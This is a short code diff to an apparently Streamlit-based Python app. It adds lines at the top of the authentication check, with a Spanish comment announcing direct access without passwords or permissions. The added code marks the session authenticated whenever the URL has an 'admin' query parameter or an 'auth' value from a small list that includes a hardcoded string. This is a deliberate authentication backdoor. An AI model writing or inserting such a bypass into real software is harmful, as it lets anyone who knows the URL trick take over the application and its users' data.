@@ -810,6 +810,11 @@ def guardar_nueva_password(nueva_clave):
         f.writelines(lineas)
 
 def verificar_autenticacion():
+    # ⚡ Acceso directo automático sin contraseñas ni permisos (?admin=1 o ?admin)
+    if "admin" in st.query_params or st.query_params.get("auth") in ["Blitz008", "admin", "1", "si"]:
+        st.session_state["autenticado"] = True
+        return True
+
     if st.session_state.get("autenticado", False):
         return True
 
